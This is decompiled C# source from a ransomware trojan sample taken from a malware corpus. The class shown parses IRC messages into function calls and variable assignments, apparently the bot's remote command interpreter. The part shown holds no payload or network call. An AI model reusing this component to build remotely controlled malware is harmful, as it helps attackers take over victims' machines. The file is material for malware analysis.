// Decompiled with JetBrains decompiler
// Type: rundll32.functionParser
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections.Generic;

namespace rundll32
{
  internal class functionParser
  {
    public static List<functionVariable> Variables = new List<functionVariable>();

    public static functionResponse parse(ircMessage input) => functionParser.parse(input.message);

    public static functionResponse parse(string input)
    {
      try
      {
        if (input.Contains("(") && input.Contains(")"))
        {
          if (input.IndexOf('(') >= input.LastIndexOf(')'))
            return (functionResponse) null;
          string str1 = input.Substring(0, input.IndexOf('(')).Replace(" ", "");
          if (!functionParser.IsLetters(str1))
            return (functionResponse) null;
          int startIndex1 = input.IndexOf("(") + 1;
          int num1 = input.LastIndexOf(")");
          string str2 = input.Substring(startIndex1, num1 - startIndex1);
          string str3 = "";
          int startIndex2 = 0;
          bool flag = true;
          List<int[]> numArrayList = new List<int[]>();
          while (flag)
          {
            try
            {
              int length = str2.IndexOf("\"", startIndex2) + 1;
              int startIndex3 = length != 0 ? str2.IndexOf("\"", length + 1) : throw new Exception();
              if (startIndex3 == 0)
                throw new Exception();
              int num2 = startIndex3 - length;
              while (str3.Length != length)
                str3 += "?";
              for (int index = 0; index < num2; ++index)
                str3 += (string) (object) str2[length + index];
              string str4 = "";
              while (str4.Length != num2)
                str4 += "?";
              string str5 = str2.Substring(0, length);
              string str6 = str2.Substring(startIndex3);
              str2 = str5 + str4 + str6;
              startIndex2 = startIndex3 + 1;
              numArrayList.Add(new int[2]
              {
                length,
                startIndex3
              });
            }
            catch
            {
              flag = false;
              while (str3.Length < str2.Length)
                str3 += "?";
            }
          }
          string str7 = str2.Replace(',', '\n');
          foreach (int[] numArray in numArrayList)
          {
            int num3 = numArray[0];
            int startIndex4 = numArray[1];
            int length = startIndex4 - num3;
            string str8 = str7.Substring(0, num3);
            string str9 = str7.Substring(startIndex4);
            string str10 = str3.Substring(num3, length);
            str7 = str8 + str10 + str9;
          }
          string[] strArray = str7.Split('\n');
          functionVariable[] Arguments = new functionVariable[strArray.Length];
          for (int index = 0; index < strArray.Length; ++index)
          {
            string str11 = strArray[index];
            Arguments[index] = functionParser.toFunctionVariable(str11);
          }
          if (Arguments.Length == 1 && Arguments[0] == null)
            Arguments = new functionVariable[0];
          return new functionResponse(str1, Arguments);
        }
        string[] strArray1 = input.Split('=');
        if (strArray1.Length != 2)
          return (functionResponse) null;
        strArray1[0] = strArray1[0].Replace(" ", "");
        if (!functionParser.IsLetters(strArray1[0]) || !strArray1[1].EndsWith(";"))
          return (functionResponse) null;
        strArray1[1] = strArray1[1].Substring(0, strArray1[1].Length - 1);
        if (strArray1[1].Contains("\""))
        {
          string[] strArray2 = strArray1[1].Split('"');
          if (strArray2.Length != 3)
            return (functionResponse) null;
          string Name = strArray1[0];
          string str = strArray2[1];
          foreach (functionVariable variable in functionParser.Variables)
          {
            if (variable.Name.Equals((object) Name))
            {
              functionParser.Variables[functionParser.Variables.IndexOf(variable)].Value = (object) str;
              return (functionResponse) null;
            }
          }
          functionParser.Variables.Add(new functionVariable(Name, (object) str));
          return (functionResponse) null;
        }
        if (functionParser.IsLetters(strArray1[1].Replace(" ", "")))
        {
          if (strArray1[0].ToLower().Equals("false") && strArray1[0].ToLower().Equals("true"))
            return (functionResponse) null;
          strArray1[1] = strArray1[1].Replace(" ", "");
          if (strArray1[1].ToLower() != "false" && strArray1[1].ToLower() != "true")
          {
            string Name = strArray1[0];
            object obj = (object) null;
            foreach (functionVariable variable in functionParser.Variables)
            {
              if (variable.Name.Equals((object) strArray1[1]))
                obj = variable.Value;
            }
            if (obj != null)
            {
              foreach (functionVariable variable in functionParser.Variables)
              {
                if (variable.Name.Equals((object) Name))
                {
                  functionParser.Variables[functionParser.Variables.IndexOf(variable)].Value = obj;
                  return (functionResponse) null;
                }
              }
            }
            functionParser.Variables.Add(new functionVariable(Name, obj));
            return (functionResponse) null;
          }
          string Name1 = strArray1[0];
          bool flag = false;
          if (strArray1[1].ToLower() == "true")
            flag = true;
          foreach (functionVariable variable in functionParser.Variables)
          {
            if (variable.Name.Equals((object) Name1))
            {
              functionParser.Variables[functionParser.Variables.IndexOf(variable)].Value = (object) flag;
              return (functionResponse) null;
            }
          }
          functionParser.Variables.Add(new functionVariable(Name1, (object) flag));
          return (functionResponse) null;
        }
        if (!functionParser.IsNumbers(strArray1[1].Replace(" ", "")))
          return (functionResponse) null;
        string Name2 = strArray1[0];
        int num = int.Parse(strArray1[1].Replace(" ", ""));
        foreach (functionVariable variable in functionParser.Variables)
        {
          if (variable.Name.Equals((object) Name2))
          {
            functionParser.Variables[functionParser.Variables.IndexOf(variable)].Value = (object) num;
            return (functionResponse) null;
          }
        }
        functionParser.Variables.Add(new functionVariable(Name2, (object) num));
        return (functionResponse) null;
      }
      catch
      {
        return (functionResponse) null;
      }
    }

    private static bool IsLetters(string inputStr)
    {
      inputStr = inputStr.Replace(".", "").Replace(":", "");
      if (string.IsNullOrEmpty(inputStr))
        return false;
      int num = 0;
      for (int index = 0; index < inputStr.Length; ++index)
      {
        if (char.IsNumber(inputStr[index]))
          ++num;
        if (!char.IsLetter(inputStr[index]) && !char.IsNumber(inputStr[index]))
          return false;
      }
      return num != inputStr.Length;
    }

    private static bool IsNumbers(string inputStr)
    {
      if (string.IsNullOrEmpty(inputStr))
        return false;
      for (int index = 0; index < inputStr.Length; ++index)
      {
        if (!char.IsNumber(inputStr[index]))
          return false;
      }
      return true;
    }

    private static functionVariable toFunctionVariable(string value)
    {
      if (value.Contains("\""))
      {
        string[] strArray = value.Split('"');
        if (strArray.Length != 3)
          return (functionVariable) null;
        value = strArray[1];
        return new functionVariable("temp", (object) value);
      }
      if (functionParser.IsLetters(value.Replace(" ", "")))
      {
        value = value.Replace(" ", "");
        object obj = (object) null;
        foreach (functionVariable variable in functionParser.Variables)
        {
          if (variable.Name.Equals((object) value))
            obj = variable.Value;
        }
        return obj != null ? new functionVariable(value, obj) : (functionVariable) null;
      }
      return functionParser.IsNumbers(value.Replace(" ", "")) ? new functionVariable("temp", (object) int.Parse(value.Replace(" ", ""))) : (functionVariable) null;
    }
  }
}
